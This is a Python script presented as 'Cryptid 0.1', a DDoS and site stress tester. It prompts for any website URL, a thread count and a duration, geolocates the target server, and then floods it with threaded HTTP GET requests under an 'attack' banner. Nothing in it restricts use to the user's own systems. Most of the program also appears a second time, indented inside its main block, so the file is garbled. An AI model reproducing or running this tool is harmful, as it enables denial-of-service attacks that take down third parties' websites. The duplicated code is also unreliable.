import os
import sys
import subprocess
import platform
import socket
import requests
import argparse
import threading
import time
import signal
from urllib.parse import urlparse
from colorama import Fore, Style, init

# Function to check if a package is installed
def check_install(package):
    try:
        import importlib
        importlib.import_module(package)
        return True
    except ImportError:
        return False

# Function to install required packages if not already installed
def install_packages():
    required_packages = ['requests', 'colorama']
    for package in required_packages:
        if not check_install(package):
            print(f"Installing {package}...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])

# Install required packages if not already installed
install_packages()

# Importing necessary modules after installation
import requests
from colorama import Fore, Style, init

# Initialize colorama for cross-platform colored text
init()

# Custom ASCII art (replace with your own)
custom_ascii_art = """


        ▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀     ██████ ▄▄▄█████▓ ▄▄▄       ██▀███  
        ▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒    ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒
        ░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░    ░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒
        ░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄      ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  
        ░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄   ▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒
         ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒   ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░
         ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░   ░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░▒ ░ ▒░
         ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░    ░  ░  ░    ░        ░   ▒     ░░   ░ 
           ░          ░  ░   ░     ░  ░            ░                 ░  ░   ░     
         ░                                                                        
                                                                    
– 𝙰𝚗𝚍 𝚝𝚘 𝙰𝚕𝚕𝚊𝚑 𝚋𝚎𝚕𝚘𝚗𝚐𝚜 𝚝𝚑𝚎 𝚔𝚒𝚗𝚐𝚍𝚘𝚖 𝚘𝚏 𝚝𝚑𝚎 𝚑𝚎𝚊𝚟𝚎𝚗𝚜 𝚊𝚗𝚍 𝚝𝚑𝚎 𝚎𝚊𝚛𝚝𝚑. 𝙰𝚗𝚍 𝙰𝚕𝚕𝚊𝚑 𝚑𝚊𝚜 𝚙𝚘𝚠𝚎𝚛 𝚘𝚟𝚎𝚛 𝚊𝚕𝚕 𝚝𝚑𝚒𝚗𝚐𝚜 –
                                ✷ 𝙰𝚕-𝚀𝚞𝚛𝚊𝚗: 3:189 ✷

♦ 𝚃𝚘𝚘𝚕 𝙽𝚊𝚖𝚎: 𝑪𝒓𝒚𝒑𝒕𝒊𝒅 0.1
♦ 𝚃𝚘𝚘𝚕 𝚃𝚢𝚙𝚎: 𝑫𝑫𝑶𝑺 & 𝑺𝒊𝒕𝒆 𝑺𝒕𝒓𝒆𝒔𝒔 𝑻𝒆𝒔𝒕𝒆𝒓
♦ 𝚃𝚘𝚘𝚕 𝚅𝚎𝚛𝚜𝚒𝚘𝚗: 0.1
♦ 𝚃𝚘𝚘𝚕 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛: 𝑫𝒂𝒓𝒌 𝑺𝒕𝒂𝒓

"""

# Function to handle SIGINT (Ctrl+C) gracefully
def signal_handler(sig, frame):
    clear_terminal()
    print(f"{Fore.CYAN}★ 𝚃𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐. 𝚂𝚝𝚊𝚢 𝚂𝚊𝚏𝚎 & 𝙲𝚘𝚘𝚕 ★{Style.RESET_ALL}")
    sys.exit(0)

# Function to clear terminal screen
def clear_terminal():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

# Function to validate URL and handle protocol prefix
def validate_url(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url
    try:
        requests.get(url)
        return True, url
    except requests.exceptions.RequestException:
        return False, url

# Function to resolve IP address of the URL
def resolve_ip(url):
    try:
        ip_address = socket.gethostbyname(urlparse(url).netloc)
        return ip_address
    except socket.gaierror:
        return "Unknown"

# Function to get server location using ip-api.com
def get_server_location(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    try:
        response = requests.get(url)
        data = response.json()
        if data['status'] == 'success':
            city = data['city']
            country = data['country']
            return f"{city}, {country}"
        else:
            return "Unknown"
    except requests.exceptions.RequestException:
        return "Unknown"

# Function to perform the DDoS attack
def attack(url, threads, duration):
    print(f"{Fore.YELLOW}█▓▒▒░░░ 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝚒𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗 ░░░▒▒▓█{Style.RESET_ALL}")

    # Fetch IP address and server location
    ip_address = resolve_ip(url)
    server_location = get_server_location(ip_address)

    # Display attack parameters
    print(f"{Fore.CYAN}● 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝚄𝚁𝙻: {Fore.YELLOW}{url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}● 𝙸𝙿 𝙰𝚍𝚍𝚛𝚎𝚜𝚜: {Fore.YELLOW}{ip_address}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}● 𝚂𝚎𝚛𝚟𝚎𝚛 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚘𝚏 𝚆𝚎𝚋𝚜𝚒𝚝𝚎: {Fore.YELLOW}{server_location}{Style.RESET_ALL}")
    print()
    
    # Display attack details

    print(f"{Fore.RED}★ 𝙰𝚝𝚝𝚊𝚌𝚔 𝙸𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗 ★{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}● 𝚃𝚊𝚛𝚐𝚎𝚝𝚎𝚍 𝚂𝚒𝚝𝚎: {Fore.WHITE}{url}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}● 𝚃𝚘𝚝𝚊𝚕 𝚃𝚑𝚛𝚎𝚊𝚍𝚜: {Fore.WHITE}{threads}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}● 𝚃𝚘𝚝𝚊𝚕 𝚃𝚒𝚖𝚎: {Fore.WHITE}{duration} seconds{Style.RESET_ALL}")

    print()
    print(f"{Fore.BLUE}» Press \"ctrl + c\" to stop attack «")

    # Prompt user to start attack
    input(f"{Fore.YELLOW}🔥 𝙿𝚛𝚎𝚜𝚜 𝙴𝚗𝚝𝚎𝚛 𝚝𝚘 𝚂𝚝𝚊𝚛𝚝 𝙰𝚝𝚝𝚊𝚌𝚔 🔥{Style.RESET_ALL}")

    # Start the attack
    try:
        start_time = time.time()
        thread_id = 0
        while (time.time() - start_time) < duration:
            for i in range(min(5, threads)):  # Send up to 5 threads or remaining threads
                thread_id += 1
                threading.Thread(target=send_request, args=(url, thread_id)).start()
                time.sleep(0.01)  # Adjust as needed for rate control
            time.sleep(0.1)  # Adjust as needed for rate control
    except KeyboardInterrupt:
        clear_terminal()
        print(f"{Fore.CYAN}★ 𝚃𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐. 𝚂𝚝𝚊𝚢 𝚂𝚊𝚏𝚎 & 𝙲𝚘𝚘𝚕 ★{Style.RESET_ALL}")

def send_request(url, thread_id):
    try:
        requests.get(url)
        print(f"{Fore.RED}★ 𝚃𝚑𝚛𝚎𝚊𝚍𝚜 𝚂𝚎𝚗𝚝({thread_id}) ★{Style.RESET_ALL}")
    except requests.exceptions.RequestException:
        pass  # Handle request exception silently

if __name__ == "__main__":
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    # Print custom ASCII art
    print(f"{Fore.RED}{custom_ascii_art}{Style.RESET_ALL}")

    try:
        # Prompt user for website URL
        while True:
            user_url = input(f"{Fore.YELLOW}★ 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝚄𝚁𝙻: {Style.RESET_ALL}")
            valid, user_url = validate_url(user_url)
            if valid:
                print(f"{Fore.GREEN}★ 𝚁𝙸𝙶𝙷𝚃 𝚄𝚁𝙻 ★{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}★ 𝚆𝚁𝙾𝙽𝙶 𝚄𝚁𝙻 ★{Style.RESET_ALL}")
                print(f"{Fore.RED}Please enter a valid URL.{Style.RESET_ALL}")

        # Prompt user for number of threads
        while True:
            try:
                threads = int(input(f"{Fore.RED}★ 𝚃𝚘𝚝𝚊𝚕 𝚃𝚑𝚛𝚎𝚊𝚍𝚜: {Style.RESET_ALL}"))
                break
            except ValueError:
                print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")

        # Prompt user for attack duration
        while True:
            try:
                duration = int(input(f"{Fore.CYAN}★ 𝚃𝚘𝚝𝚊𝚕 𝚃𝚒𝚖𝚎: {Style.RESET_ALL}"))
                break
            except ValueError:
                print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")

                # Display attack parameters and start attack
        clear_terminal()
        attack(user_url, threads, duration)

    except KeyboardInterrupt:
        clear_terminal()
        print(f"{Fore.CYAN}★ 𝚃𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐. 𝚂𝚝𝚊𝚢 𝚂𝚊𝚏𝚎 & 𝙲𝚘𝚘𝚕 ★{Style.RESET_ALL}")
        sys.exit(0)

    # Function to clear terminal screen
    def clear_terminal():
        if platform.system() == 'Windows':
            os.system('cls')
        else:
            os.system('clear')

    # Function to validate URL and handle protocol prefix
    def validate_url(url):
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url
        try:
            requests.get(url)
            return True, url
        except requests.exceptions.RequestException:
            return False, url

    # Function to resolve IP address of the URL
    def resolve_ip(url):
        try:
            ip_address = socket.gethostbyname(urlparse(url).netloc)
            return ip_address
        except socket.gaierror:
            return "Unknown"

    # Function to get server location using ip-api.com
    def get_server_location(ip_address):
        url = f"http://ip-api.com/json/{ip_address}"
        try:
            response = requests.get(url)
            data = response.json()
            if data['status'] == 'success':
                city = data['city']
                country = data['country']
                return f"{city}, {country}"
            else:
                return "Unknown"
        except requests.exceptions.RequestException:
            return "Unknown"

    # Function to perform the DDoS attack
    def attack(url, threads, duration):
        print(f"{Fore.YELLOW}█▓▒▒░░░ 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝚒𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗 ░░░▒▒▓█{Style.RESET_ALL}")

        # Fetch IP address and server location
        ip_address = resolve_ip(url)
        server_location = get_server_location(ip_address)

        # Display attack parameters
        print(f"{Fore.CYAN}● 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝚄𝚁𝙻: {Fore.YELLOW}{url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}● 𝙸𝙿 𝙰𝚍𝚍𝚛𝚎𝚜𝚜: {Fore.YELLOW}{ip_address}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}● 𝚂𝚎𝚛𝚟𝚎𝚛 𝙻𝚘𝚌𝚊𝚝𝚒𝚘𝚗 𝚘𝚏 𝚆𝚎𝚋𝚜𝚒𝚝𝚎: {Fore.YELLOW}{server_location}{Style.RESET_ALL}")

        print(f"{Fore.RED}★ 𝙰𝚝𝚝𝚊𝚌𝚔 𝙸𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗 ★{Style.RESET_ALL}")

        # Display attack details
        print(f"{Fore.MAGENTA}● 𝚃𝚊𝚛𝚐𝚎𝚝𝚎𝚍 𝚂𝚒𝚝𝚎: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}● 𝚃𝚘𝚝𝚊𝚕 𝚃𝚑𝚛𝚎𝚊𝚍𝚜: {Fore.WHITE}{threads}{Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}● 𝚃𝚘𝚝𝚊𝚕 𝚃𝚒𝚖𝚎: {Fore.WHITE}{duration} seconds{Style.RESET_ALL}")

        print(f"» Press \"ctrl + c\" to stop attack «")

        # Prompt user to start attack
        input(f"{Fore.YELLOW}🔥 𝙿𝚛𝚎𝚜𝚜 𝙴𝚗𝚝𝚎𝚛 𝚝𝚘 𝚂𝚝𝚊𝚛𝚝 𝙰𝚝𝚝𝚊𝚌𝚔 🔥{Style.RESET_ALL}")

        # Start the attack
        try:
            start_time = time.time()
            thread_id = 0
            while (time.time() - start_time) < duration:
                for i in range(min(5, threads)):  # Send up to 5 threads or remaining threads
                    thread_id += 1
                    threading.Thread(target=send_request, args=(url, thread_id)).start()
                    time.sleep(0.01)  # Adjust as needed for rate control
                time.sleep(0.1)  # Adjust as needed for rate control
        except KeyboardInterrupt:
            clear_terminal()
            print(f"{Fore.CYAN}★ 𝚃𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐. 𝚂𝚝𝚊𝚢 𝚂𝚊𝚏𝚎 & 𝙲𝚘𝚘𝚕 ★{Style.RESET_ALL}")

    def send_request(url, thread_id):
        try:
            requests.get(url)
            print(f"{Fore.RED}★ 𝚃𝚑𝚛𝚎𝚊𝚍𝚜 𝚂𝚎𝚗𝚝({thread_id}) ★{Style.RESET_ALL}")
        except requests.exceptions.RequestException:
            pass  # Handle request exception silently

    if __name__ == "__main__":
        # Register signal handler for Ctrl+C
        signal.signal(signal.SIGINT, signal_handler)

        # Print custom ASCII art
        print(f"{Fore.RED}{custom_ascii_art}{Style.RESET_ALL}")

        try:
            # Prompt user for website URL
            while True:
                user_url = input(f"{Fore.YELLOW}★ 𝚆𝚎𝚋𝚜𝚒𝚝𝚎 𝚄𝚁𝙻: {Style.RESET_ALL}")
                valid, user_url = validate_url(user_url)
                if valid:
                    print(f"{Fore.GREEN}★ 𝚁𝙸𝙶𝙷𝚃 𝚄𝚁𝙻 ★{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}★ 𝚆𝚁𝙾𝙽𝙶 𝚄𝚁𝙻 ★{Style.RESET_ALL}")
                    print(f"{Fore.RED}Please enter a valid URL.{Style.RESET_ALL}")

            # Prompt user for number of threads
            while True:
                try:
                    threads = int(input(f"{Fore.RED}★ 𝚃𝚘𝚝𝚊𝚕 𝚃𝚑𝚛𝚎𝚊𝚍𝚜: {Style.RESET_ALL}"))
                    break
                except ValueError:
                    print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")

            # Prompt user for attack duration
            while True:
                try:
                    duration = int(input(f"{Fore.CYAN}★ 𝚃𝚘𝚝𝚊𝚕 𝚃𝚒𝚖𝚎: {Style.RESET_ALL}"))
                    break
                except ValueError:
                    print(f"{Fore.RED}Please enter a valid number.{Style.RESET_ALL}")

            # Display attack parameters and start attack
            clear_terminal()
            attack(user_url, threads, duration)

        except KeyboardInterrupt:
            clear_terminal()
            print(f"{Fore.CYAN}★ 𝚃𝚑𝚊𝚗𝚔𝚜 𝚏𝚘𝚛 𝚞𝚜𝚒𝚗𝚐. 𝚂𝚝𝚊𝚢 𝚂𝚊𝚏𝚎 & 𝙲𝚘𝚘𝚕 ★{Style.RESET_ALL}")